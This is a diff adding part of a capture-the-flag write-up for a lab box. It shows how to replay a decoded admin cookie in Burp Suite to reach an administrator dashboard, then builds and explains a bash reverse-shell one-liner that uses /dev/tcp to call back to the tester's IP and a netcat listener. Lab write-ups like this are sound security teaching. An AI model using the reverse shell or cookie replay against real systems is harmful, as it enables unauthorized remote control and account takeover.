@@ -110,5 +110,30 @@ The outcome is the decoded admin cookie:
 
 (pic14)
 
+Turn off the intercept in Burp-suite, go back the the Burp browser and introduce `http://10.10.11.8:5000/dashboard`. You will access to the Forbidden site. Turn on the intercept and refresh the site. You will observe the following outcome:
 
+(pic15)
+
+Introduce the following fields: `Cache-Control: max-age=0` and `Cookie: {cokie deciphered}. Click "Forward" and you will get in the Administrator Dashboard.
+
+(pic16)
+
+In the context of a penetration test or a capture-the-flag (CTF) challenge, the goal is often to gain a shell on the target system (the webserver). This provides deeper access and control over the target, allowing the tester to explore and potentially escalate privileges further. From here the reasoning is the following:
+
+1. Assessing Input Fields: Exploring the web application to identify points where malicious commands can be injected.
+2. Getting a Shell: The goal is to obtain a reverse shell to gain interactive access to the target system.
+3. Design Payload: A payload must be designed to open a reverse shell connection. It uses bash to create an interactive shell session that redirects input and output to the attacker's machine, effectively giving the attacker remote control over the target system.
+
+We know that we are in the correct path because we are behind a protected page that required authenticated access (admin cookie), which has higher privilege or access to more sensitive parts of the application. Getting a shell means the user can interact with the target system more freely, execute commands, and explore the environment. This is a significant step in gaining control over the system.
+
+Open a new terminal tab and create a file `vim payload.sh` with the following content:
+
+```
+/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'
+```
+
+1. `/bin/bash -c`: Tells the CLI to run the following command using the bash shell.
+2. `'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'`: The core of the reverse shell command. `exec bash -i` This starts an interactive bash shell. `/dev/tcp/` is a Bash feature that allows TCP connections to be treated like files, when a program writes to this path it actually sends data over the network to the specified IP address and port ({IP}/1111). `0>&1`makes the standard input of the Bash shell read from the TCP connection.
+
+The IP address must be your IP address (mine is `10.10.14.10`) and the /1111 is the port we are going to set (you can set whichever you want to) for a netcat listener.
 
